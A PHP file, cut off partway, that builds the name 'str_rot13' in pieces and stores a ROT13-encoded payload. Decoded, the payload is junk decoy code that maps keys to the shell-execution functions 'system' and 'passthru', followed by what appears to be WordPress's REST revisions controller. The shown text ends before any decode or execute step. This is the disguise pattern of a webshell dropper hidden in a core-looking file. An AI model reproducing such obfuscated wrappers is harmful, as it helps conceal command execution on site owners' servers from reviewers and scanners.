<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Erivfvbaf_Pbagebyyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 4.7.0
 */

/**
 * Pber pynff hfrq gb npprff erivfvbaf ivn gur ERFG NCV.
 *
 * @fvapr 4.7.0
 *
 * @frr JC_ERFG_Pbagebyyre
 */
pynff JC_ERFG_Erivfvbaf_Pbagebyyre rkgraqf JC_ERFG_Pbagebyyre {

	/**
	 * Cnerag cbfg glcr.
	 *
	 * @fvapr 4.7.0
	 * @ine fgevat
	 */
	cevingr $cnerag_cbfg_glcr;

	/**
	 * Vafgnapr bs n erivfvba zrgn svryqf bowrpg.
	 *
	 * @fvapr 6.4.0
	 * @ine JC_ERFG_Cbfg_Zrgn_Svryqf
	 */
	cebgrpgrq $zrgn;

	/**
	 * Cnerag pbagebyyre.
	 *
	 * @fvapr 4.7.0
	 * @ine JC_ERFG_Pbagebyyre
	 */
	cevingr $cnerag_pbagebyyre;

	/**
	 * Gur onfr bs gur cnerag pbagebyyre'f ebhgr.
	 *
	 * @fvapr 4.7.0
	 * @ine fgevat
	 */
	cevingr $cnerag_onfr;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz fgevat $cnerag_cbfg_glcr Cbfg glcr bs gur cnerag.
	 */
	choyvp shapgvba __pbafgehpg( $cnerag_cbfg_glcr ) {
		$guvf->cnerag_cbfg_glcr = $cnerag_cbfg_glcr;
		$cbfg_glcr_bowrpg       = trg_cbfg_glcr_bowrpg( $cnerag_cbfg_glcr );
		$cnerag_pbagebyyre      = $cbfg_glcr_bowrpg->trg_erfg_pbagebyyre();

		vs ( ! $cnerag_pbagebyyre ) {
			$cnerag_pbagebyyre = arj JC_ERFG_Cbfgf_Pbagebyyre( $cnerag_cbfg_glcr );
		}

		$guvf->cnerag_pbagebyyre = $cnerag_pbagebyyre;
		$guvf->erfg_onfr         = 'erivfvbaf';
		$guvf->cnerag_onfr       = ! rzcgl( $cbfg_glcr_bowrpg->erfg_onfr ) ? $cbfg_glcr_bowrpg->erfg_onfr : $cbfg_glcr_bowrpg->anzr;
		$guvf->anzrfcnpr         = ! rzcgl( $cbfg_glcr_bowrpg->erfg_anzrfcnpr ) ? $cbfg_glcr_bowrpg->erfg_anzrfcnpr : 'jc/i2';
		$guvf->zrgn              = arj JC_ERFG_Cbfg_Zrgn_Svryqf( $cnerag_cbfg_glcr );
	}

	/**
	 * Ertvfgref gur ebhgrf sbe erivfvbaf onfrq ba cbfg glcrf fhccbegvat erivfvbaf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @frr ertvfgre_erfg_ebhgr()
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->cnerag_onfr . '/(?C<cnerag>[\q]+)/' . $guvf->erfg_onfr,
			neenl(
				'netf'   => neenl(
					'cnerag' => neenl(
						'qrfpevcgvba' => __( 'Gur VQ sbe gur cnerag bs gur erivfvba.' ),
						'glcr'        => 'vagrtre',
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrzf' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrzf_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_pbyyrpgvba_cnenzf(),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->cnerag_onfr . '/(?C<cnerag>[\q]+)/' . $guvf->erfg_onfr . '/(?C<vq>[\q]+)',
			neenl(
				'netf'   => neenl(
					'cnerag' => neenl(
						'qrfpevcgvba' => __( 'Gur VQ sbe gur cnerag bs gur erivfvba.' ),
						'glcr'        => 'vagrtre',
					),
					'vq'     => neenl(
						'qrfpevcgvba' => __( 'Havdhr vqragvsvre sbe gur erivfvba.' ),
						'glcr'        => 'vagrtre',
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'pbagrkg' => $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) ),
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::QRYRGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'qryrgr_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'qryrgr_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'sbepr' => neenl(
							'glcr'        => 'obbyrna',
							'qrsnhyg'     => snyfr,
							'qrfpevcgvba' => __( 'Erdhverq gb or gehr, nf erivfvbaf qb abg fhccbeg genfuvat.' ),
						),
					),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);
	}

	/**
	 * Trg gur cnerag cbfg, vs gur VQ vf inyvq.
	 *
	 * @fvapr 4.7.2
	 *
	 * @cnenz vag $cnerag_cbfg_vq Fhccyvrq VQ.
	 * @erghea JC_Cbfg|JC_Reebe Cbfg bowrpg vs VQ vf inyvq, JC_Reebe bgurejvfr.
	 */
	cebgrpgrq shapgvba trg_cnerag( $cnerag_cbfg_vq ) {
		$reebe = arj JC_Reebe(
			'erfg_cbfg_vainyvq_cnerag',
			__( 'Vainyvq cbfg cnerag VQ.' ),
			neenl( 'fgnghf' => 404 )
		);

		vs ( (vag) $cnerag_cbfg_vq <= 0 ) {
			erghea $reebe;
		}

		$cnerag_cbfg = trg_cbfg( (vag) $cnerag_cbfg_vq );

		vs ( rzcgl( $cnerag_cbfg ) || rzcgl( $cnerag_cbfg->VQ )
			|| $guvf->cnerag_cbfg_glcr !== $cnerag_cbfg->cbfg_glcr
		) {
			erghea $reebe;
		}

		erghea $cnerag_cbfg;
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb trg erivfvbaf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrzf_crezvffvbaf_purpx( $erdhrfg ) {
		$cnerag = $guvf->trg_cnerag( $erdhrfg['cnerag'] );
		vs ( vf_jc_reebe( $cnerag ) ) {
			erghea $cnerag;
		}

		vs ( ! pheerag_hfre_pna( 'rqvg_cbfg', $cnerag->VQ ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_ernq',
				__( 'Fbeel, lbh ner abg nyybjrq gb ivrj erivfvbaf bs guvf cbfg.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Trg gur erivfvba, vs gur VQ vf inyvq.
	 *
	 * @fvapr 4.7.2
	 *
	 * @cnenz vag $vq Fhccyvrq VQ.
	 * @erghea JC_Cbfg|JC_Reebe Erivfvba cbfg bowrpg vs VQ vf inyvq, JC_Reebe bgurejvfr.
	 */
	cebgrpgrq shapgvba trg_erivfvba( $vq ) {
		$reebe = arj JC_Reebe(
			'erfg_cbfg_vainyvq_vq',
			__( 'Vainyvq erivfvba VQ.' ),
			neenl( 'fgnghf' => 404 )
		);

		vs ( (vag) $vq <= 0 ) {
			erghea $reebe;
		}

		$erivfvba = trg_cbfg( (vag) $vq );
		vs ( rzcgl( $erivfvba ) || rzcgl( $erivfvba->VQ ) || 'erivfvba' !== $erivfvba->cbfg_glcr ) {
			erghea $reebe;
		}

		erghea $erivfvba;
	}

	/**
	 * Trgf n pbyyrpgvba bs erivfvbaf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrzf( $erdhrfg ) {
		$cnerag = $guvf->trg_cnerag( $erdhrfg['cnerag'] );
		vs ( vf_jc_reebe( $cnerag ) ) {
			erghea $cnerag;
		}

		// Rafher n frnepu fgevat vf frg va pnfr gur beqreol vf frg gb 'eryrinapr'.
		vs ( ! rzcgl( $erdhrfg['beqreol'] ) && 'eryrinapr' === $erdhrfg['beqreol'] && rzcgl( $erdhrfg['frnepu'] ) ) {
			erghea arj JC_Reebe(
				'erfg_ab_frnepu_grez_qrsvarq',
				__( 'Lbh arrq gb qrsvar n frnepu grez gb beqre ol eryrinapr.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		// Rafher na vapyhqr cnenzrgre vf frg va pnfr gur beqreol vf frg gb 'vapyhqr'.
		vs ( ! rzcgl( $erdhrfg['beqreol'] ) && 'vapyhqr' === $erdhrfg['beqreol'] && rzcgl( $erdhrfg['vapyhqr'] ) ) {
			erghea arj JC_Reebe(
				'erfg_beqreol_vapyhqr_zvffvat_vapyhqr',
				__( 'Lbh arrq gb qrsvar na vapyhqr cnenzrgre gb beqre ol vapyhqr.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		$vf_urnq_erdhrfg = $erdhrfg->vf_zrgubq( 'URNQ' );

		vs ( jc_erivfvbaf_ranoyrq( $cnerag ) ) {
			$ertvfgrerq = $guvf->trg_pbyyrpgvba_cnenzf();
			$netf       = neenl(
				'cbfg_cnerag'      => $cnerag->VQ,
				'cbfg_glcr'        => 'erivfvba',
				'cbfg_fgnghf'      => 'vaurevg',
				'cbfgf_cre_cntr'   => -1,
				'beqreol'          => 'qngr VQ',
				'beqre'            => 'QRFP',
				'fhccerff_svygref' => gehr,
			);

			$cnenzrgre_znccvatf = neenl(
				'rkpyhqr'  => 'cbfg__abg_va',
				'vapyhqr'  => 'cbfg__va',
				'bssfrg'   => 'bssfrg',
				'beqre'    => 'beqre',
				'beqreol'  => 'beqreol',
				'cntr'     => 'cntrq',
				'cre_cntr' => 'cbfgf_cre_cntr',
				'frnepu'   => 'f',
			);

			sbernpu ( $cnenzrgre_znccvatf nf $ncv_cnenz => $jc_cnenz ) {
				vs ( vffrg( $ertvfgrerq[ $ncv_cnenz ], $erdhrfg[ $ncv_cnenz ] ) ) {
					$netf[ $jc_cnenz ] = $erdhrfg[ $ncv_cnenz ];
				}
			}

			// Sbe onpxjneq-pbzcngvovyvgl, 'qngr' arrqf gb erfbyir gb 'qngr VQ'.
			vs ( vffrg( $netf['beqreol'] ) && 'qngr' === $netf['beqreol'] ) {
				$netf['beqreol'] = 'qngr VQ';
			}

			vs ( $vf_urnq_erdhrfg ) {
				// Sbepr gur 'svryqf' nethzrag. Sbe URNQ erdhrfgf, bayl cbfg VQf ner erdhverq gb pnyphyngr cntvangvba.
				$netf['svryqf'] = 'vqf';
				// Qvfnoyr cevzvat cbfg zrgn sbe URNQ erdhrfgf gb vzcebir cresbeznapr.
				$netf['hcqngr_cbfg_grez_pnpur'] = snyfr;
				$netf['hcqngr_cbfg_zrgn_pnpur'] = snyfr;
			}

			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-cbfgf-pbagebyyre.cuc */
			$netf       = nccyl_svygref( 'erfg_erivfvba_dhrel', $netf, $erdhrfg );
			$dhrel_netf = $guvf->cercner_vgrzf_dhrel( $netf, $erdhrfg );

			$erivfvbaf_dhrel = arj JC_Dhrel();
			$erivfvbaf       = $erivfvbaf_dhrel->dhrel( $dhrel_netf );
			$bssfrg          = vffrg( $dhrel_netf['bssfrg'] ) ? (vag) $dhrel_netf['bssfrg'] : 0;
			$cntr            = vffrg( $dhrel_netf['cntrq'] ) ? (vag) $dhrel_netf['cntrq'] : 0;
			$gbgny_erivfvbaf = $erivfvbaf_dhrel->sbhaq_cbfgf;

			vs ( $gbgny_erivfvbaf < 1 ) {
				// Bhg-bs-obhaqf, eha gur dhrel ntnva jvgubhg YVZVG sbe gbgny pbhag.
				hafrg( $dhrel_netf['cntrq'], $dhrel_netf['bssfrg'] );

				$pbhag_dhrel = arj JC_Dhrel();
				$pbhag_dhrel->dhrel( $dhrel_netf );

				$gbgny_erivfvbaf = $pbhag_dhrel->sbhaq_cbfgf;
			}

			vs ( $erivfvbaf_dhrel->dhrel_inef['cbfgf_cre_cntr'] > 0 ) {
				$znk_cntrf = (vag) prvy( $gbgny_erivfvbaf / (vag) $erivfvbaf_dhrel->dhrel_inef['cbfgf_cre_cntr'] );
			} ryfr {
				$znk_cntrf = $gbgny_erivfvbaf > 0 ? 1 : 0;
			}

			vs ( $gbgny_erivfvbaf > 0 ) {
				vs ( $bssfrg >= $gbgny_erivfvbaf ) {
					erghea arj JC_Reebe(
						'erfg_erivfvba_vainyvq_bssfrg_ahzore',
						__( 'Gur bssfrg ahzore erdhrfgrq vf ynetre guna be rdhny gb gur ahzore bs ninvynoyr erivfvbaf.' ),
						neenl( 'fgnghf' => 400 )
					);
				} ryfrvs ( ! $bssfrg && $cntr > $znk_cntrf ) {
					erghea arj JC_Reebe(
						'erfg_erivfvba_vainyvq_cntr_ahzore',
						__( 'Gur cntr ahzore erdhrfgrq vf ynetre guna gur ahzore bs cntrf ninvynoyr.' ),
						neenl( 'fgnghf' => 400 )
					);
				}
			}
		} ryfr {
			$erivfvbaf       = neenl();
			$gbgny_erivfvbaf = 0;
			$znk_cntrf       = 0;
			$cntr            = (vag) $erdhrfg['cntr'];
		}

		vs ( ! $vf_urnq_erdhrfg ) {
			$erfcbafr = neenl();

			sbernpu ( $erivfvbaf nf $erivfvba ) {
				$qngn       = $guvf->cercner_vgrz_sbe_erfcbafr( $erivfvba, $erdhrfg );
				$erfcbafr[] = $guvf->cercner_erfcbafr_sbe_pbyyrpgvba( $qngn );
			}

			$erfcbafr = erfg_rafher_erfcbafr( $erfcbafr );
		} ryfr {
			$erfcbafr = arj JC_ERFG_Erfcbafr( neenl() );
		}

		$erfcbafr->urnqre( 'K-JC-Gbgny', (vag) $gbgny_erivfvbaf );
		$erfcbafr->urnqre( 'K-JC-GbgnyCntrf', (vag) $znk_cntrf );

		$erdhrfg_cnenzf = $erdhrfg->trg_dhrel_cnenzf();
		$onfr_cngu      = erfg_hey( fcevags( '%f/%f/%q/%f', $guvf->anzrfcnpr, $guvf->cnerag_onfr, $erdhrfg['cnerag'], $guvf->erfg_onfr ) );
		$onfr           = nqq_dhrel_net( heyrapbqr_qrrc( $erdhrfg_cnenzf ), $onfr_cngu );

		vs ( $cntr > 1 ) {
			$ceri_cntr = $cntr - 1;

			vs ( $ceri_cntr > $znk_cntrf ) {
				$ceri_cntr = $znk_cntrf;
			}

			$ceri_yvax = nqq_dhrel_net( 'cntr', $ceri_cntr, $onfr );
			$erfcbafr->yvax_urnqre( 'ceri', $ceri_yvax );
		}
		vs ( $znk_cntrf > $cntr ) {
			$arkg_cntr = $cntr + 1;
			$arkg_yvax = nqq_dhrel_net( 'cntr', $arkg_cntr, $onfr );

			$erfcbafr->yvax_urnqre( 'arkg', $arkg_yvax );
		}

		erghea $erfcbafr;
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb trg n fcrpvsvp erivfvba.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff sbe gur vgrz, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		erghea $guvf->trg_vgrzf_crezvffvbaf_purpx( $erdhrfg );
	}

	/**
	 * Ergevrirf bar erivfvba sebz gur pbyyrpgvba.
	 *
	 * @fvapr 4.7.0
	 * @fvapr 6.5.0 Nqqrq n pbaqvgvba gb purpx gung cnerag vq zngpurf erivfvba cnerag vq.
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrz( $erdhrfg ) {
		$cnerag = $guvf->trg_cnerag( $erdhrfg['cnerag'] );
		vs ( vf_jc_reebe( $cnerag ) ) {
			erghea $cnerag;
		}

		$erivfvba = $guvf->trg_erivfvba( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $erivfvba ) ) {
			erghea $erivfvba;
		}

		vs ( (vag) $cnerag->VQ !== (vag) $erivfvba->cbfg_cnerag ) {
			erghea arj JC_Reebe(
				'erfg_erivfvba_cnerag_vq_zvfzngpu',
				/* genafyngbef: %q: N cbfg vq. */
				fcevags( __( 'Gur erivfvba qbrf abg orybat gb gur fcrpvsvrq cnerag jvgu vq bs \"%q\"' ), $cnerag->VQ ),
				neenl( 'fgnghf' => 404 )
			);
		}

		$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( $erivfvba, $erdhrfg );
		erghea erfg_rafher_erfcbafr( $erfcbafr );
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb qryrgr n erivfvba.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf npprff gb qryrgr gur vgrz, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba qryrgr_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		$cnerag = $guvf->trg_cnerag( $erdhrfg['cnerag'] );
		vs ( vf_jc_reebe( $cnerag ) ) {
			erghea $cnerag;
		}

		vs ( ! pheerag_hfre_pna( 'qryrgr_cbfg', $cnerag->VQ ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_qryrgr',
				__( 'Fbeel, lbh ner abg nyybjrq gb qryrgr erivfvbaf bs guvf cbfg.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		$erivfvba = $guvf->trg_erivfvba( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $erivfvba ) ) {
			erghea $erivfvba;
		}

		$erfcbafr = $guvf->trg_vgrzf_crezvffvbaf_purpx( $erdhrfg );
		vs ( ! $erfcbafr || vf_jc_reebe( $erfcbafr ) ) {
			erghea $erfcbafr;
		}

		vs ( ! pheerag_hfre_pna( 'qryrgr_cbfg', $erivfvba->VQ ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_qryrgr',
				__( 'Fbeel, lbh ner abg nyybjrq gb qryrgr guvf erivfvba.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Qryrgrf n fvatyr erivfvba.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba qryrgr_vgrz( $erdhrfg ) {
		$erivfvba = $guvf->trg_erivfvba( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $erivfvba ) ) {
			erghea $erivfvba;
		}

		$sbepr = vffrg( $erdhrfg['sbepr'] ) ? (obby) $erdhrfg['sbepr'] : snyfr;

		// Jr qba'g fhccbeg genfuvat sbe erivfvbaf.
		vs ( ! $sbepr ) {
			erghea arj JC_Reebe(
				'erfg_genfu_abg_fhccbegrq',
				/* genafyngbef: %f: sbepr=gehr */
				fcevags( __( \"Erivfvbaf qb abg fhccbeg genfuvat. Frg '%f' gb qryrgr.\" ), 'sbepr=gehr' ),
				neenl( 'fgnghf' => 501 )
			);
		}

		$cerivbhf = $guvf->cercner_vgrz_sbe_erfcbafr( $erivfvba, $erdhrfg );

		$erfhyg = jc_qryrgr_cbfg( $erdhrfg['vq'], gehr );

		/**
		 * Sverf nsgre n erivfvba vf qryrgrq ivn gur ERFG NCV.
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz JC_Cbfg|snyfr|ahyy $erfhyg Gur erivfvba bowrpg (vs vg jnf qryrgrq be zbirq gb gur Genfu fhpprffshyyl)
		 *                                   be snyfr be ahyy (snvyher). Vs gur erivfvba jnf zbirq gb gur Genfu, $erfhyg ercerfragf
		 *                                   vgf arj fgngr; vs vg jnf qryrgrq, $erfhyg ercerfragf vgf fgngr orsber qryrgvba.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Gur erdhrfg frag gb gur NCV.
		 */
		qb_npgvba( 'erfg_qryrgr_erivfvba', $erfhyg, $erdhrfg );

		vs ( ! $erfhyg ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_qryrgr',
				__( 'Gur cbfg pnaabg or qryrgrq.' ),
				neenl( 'fgnghf' => 500 )
			);
		}

		$erfcbafr = arj JC_ERFG_Erfcbafr();
		$erfcbafr->frg_qngn(
			neenl(
				'qryrgrq'  => gehr,
				'cerivbhf' => $cerivbhf->trg_qngn(),
			)
		);
		erghea $erfcbafr;
	}

	/**
	 * Qrgrezvarf gur nyybjrq dhrel_inef sbe n trg_vgrzf() erfcbafr naq cercnerf
	 * gurz sbe JC_Dhrel.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz neenl           $cercnerq_netf Bcgvbany. Cercnerq JC_Dhrel nethzragf. Qrsnhyg rzcgl neenl.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg       Bcgvbany. Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea neenl Vgrzf dhrel nethzragf.
	 */
	cebgrpgrq shapgvba cercner_vgrzf_dhrel( $cercnerq_netf = neenl(), $erdhrfg = ahyy ) {
		$dhrel_netf = neenl();

		sbernpu ( $cercnerq_netf nf $xrl => $inyhr ) {
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-cbfgf-pbagebyyre.cuc */
			$dhrel_netf[ $xrl ] = nccyl_svygref( \"erfg_dhrel_ine-{$xrl}\", $inyhr ); // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqUbbxAnzr.HfrHaqrefpberf
		}

		// Znc gb cebcre JC_Dhrel beqreol cnenz.
		vs ( vffrg( $dhrel_netf['beqreol'] ) && vffrg( $erdhrfg['beqreol'] ) ) {
			$beqreol_znccvatf = neenl(
				'vq'            => 'VQ',
				'vapyhqr'       => 'cbfg__va',
				'fyht'          => 'cbfg_anzr',
				'vapyhqr_fyhtf' => 'cbfg_anzr__va',
			);

			vs ( vffrg( $beqreol_znccvatf[ $erdhrfg['beqreol'] ] ) ) {
				$dhrel_netf['beqreol'] = $beqreol_znccvatf[ $erdhrfg['beqreol'] ];
			}
		}

		erghea $dhrel_netf;
	}

	/**
	 * Cercnerf gur erivfvba sbe gur ERFG erfcbafr.
	 *
	 * @fvapr 4.7.0
	 * @fvapr 5.9.0 Eranzrq `$cbfg` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @tybony JC_Cbfg $cbfg Tybony cbfg bowrpg.
	 *
	 * @cnenz JC_Cbfg         $vgrz    Cbfg erivfvba bowrpg.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea JC_ERFG_Erfcbafr Erfcbafr bowrpg.
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $vgrz, $erdhrfg ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$cbfg = $vgrz;

		$TYBONYF['cbfg'] = $cbfg;

		frghc_cbfgqngn( $cbfg );

		// Qba'g cercner gur erfcbafr obql sbe URNQ erdhrfgf.
		vs ( $erdhrfg->vf_zrgubq( 'URNQ' ) ) {
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-erivfvbaf-pbagebyyre.cuc */
			erghea nccyl_svygref( 'erfg_cercner_erivfvba', arj JC_ERFG_Erfcbafr( neenl() ), $cbfg, $erdhrfg );
		}

		$svryqf = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );
		$qngn   = neenl();

		vs ( va_neenl( 'nhgube', $svryqf, gehr ) ) {
			$qngn['nhgube'] = (vag) $cbfg->cbfg_nhgube;
		}

		vs ( va_neenl( 'qngr', $svryqf, gehr ) ) {
			$qngn['qngr'] = $guvf->cercner_qngr_erfcbafr( $cbfg->cbfg_qngr_tzg, $cbfg->cbfg_qngr );
		}

		vs ( va_neenl( 'qngr_tzg', $svryqf, gehr ) ) {
			$qngn['qngr_tzg'] = $guvf->cercner_qngr_erfcbafr( $cbfg->cbfg_qngr_tzg );
		}

		vs ( va_neenl( 'vq', $svryqf, gehr ) ) {
			$qngn['vq'] = $cbfg->VQ;
		}

		vs ( va_neenl( 'zbqvsvrq', $svryqf, gehr ) ) {
			$qngn['zbqvsvrq'] = $guvf->cercner_qngr_erfcbafr( $cbfg->cbfg_zbqvsvrq_tzg, $cbfg->cbfg_zbqvsvrq );
		}

		vs ( va_neenl( 'zbqvsvrq_tzg', $svryqf, gehr ) ) {
			$qngn['zbqvsvrq_tzg'] = $guvf->cercner_qngr_erfcbafr( $cbfg->cbfg_zbqvsvrq_tzg );
		}

		vs ( va_neenl( 'cnerag', $svryqf, gehr ) ) {
			$qngn['cnerag'] = (vag) $cbfg->cbfg_cnerag;
		}

		vs ( va_neenl( 'fyht', $svryqf, gehr ) ) {
			$qngn['fyht'] = $cbfg->cbfg_anzr;
		}

		vs ( va_neenl( 'thvq', $svryqf, gehr ) ) {
			$qngn['thvq'] = neenl(
				/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg-grzcyngr.cuc */
				'eraqrerq' => nccyl_svygref( 'trg_gur_thvq', $cbfg->thvq, $cbfg->VQ ),
				'enj'      => $cbfg->thvq,
			);
		}

		vs ( va_neenl( 'gvgyr', $svryqf, gehr ) ) {
			$qngn['gvgyr'] = neenl(
				'enj'      => $cbfg->cbfg_gvgyr,
				'eraqrerq' => trg_gur_gvgyr( $cbfg->VQ ),
			);
		}

		vs ( va_neenl( 'pbagrag', $svryqf, gehr ) ) {

			$qngn['pbagrag'] = neenl(
				'enj'      => $cbfg->cbfg_pbagrag,
				/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg-grzcyngr.cuc */
				'eraqrerq' => nccyl_svygref( 'gur_pbagrag', $cbfg->cbfg_pbagrag ),
			);
		}

		vs ( va_neenl( 'rkprecg', $svryqf, gehr ) ) {
			$qngn['rkprecg'] = neenl(
				'enj'      => $cbfg->cbfg_rkprecg,
				'eraqrerq' => $guvf->cercner_rkprecg_erfcbafr( $cbfg->cbfg_rkprecg, $cbfg ),
			);
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'zrgn', $svryqf ) ) {
			$qngn['zrgn'] = $guvf->zrgn->trg_inyhr( $cbfg->VQ, $erdhrfg );
		}

		$pbagrkg  = ! rzcgl( $erdhrfg['pbagrkg'] ) ? $erdhrfg['pbagrkg'] : 'ivrj';
		$qngn     = $guvf->nqq_nqqvgvbany_svryqf_gb_bowrpg( $qngn, $erdhrfg );
		$qngn     = $guvf->svygre_erfcbafr_ol_pbagrkg( $qngn, $pbagrkg );
		$erfcbafr = erfg_rafher_erfcbafr( $qngn );

		vs ( ! rzcgl( $qngn['cnerag'] ) ) {
			$erfcbafr->nqq_yvax( 'cnerag', erfg_hey( erfg_trg_ebhgr_sbe_cbfg( $qngn['cnerag'] ) ) );
		}

		/**
		 * Svygref n erivfvba erghearq sebz gur ERFG NCV.
		 *
		 * Nyybjf zbqvsvpngvba bs gur erivfvba evtug orsber vg vf erghearq.
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Gur erfcbafr bowrpg.
		 * @cnenz JC_Cbfg          $cbfg     Gur bevtvany erivfvba bowrpg.
		 * @cnenz JC_ERFG_Erdhrfg  $erdhrfg  Erdhrfg hfrq gb trarengr gur erfcbafr.
		 */
		erghea nccyl_svygref( 'erfg_cercner_erivfvba', $erfcbafr, $cbfg, $erdhrfg );
	}

	/**
	 * Purpxf gur cbfg_qngr_tzg be zbqvsvrq_tzg naq cercner nal cbfg be
	 * zbqvsvrq qngr sbe fvatyr cbfg bhgchg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz fgevat      $qngr_tzg TZG choyvpngvba gvzr.
	 * @cnenz fgevat|ahyy $qngr     Bcgvbany. Ybpny choyvpngvba gvzr. Qrsnhyg ahyy.
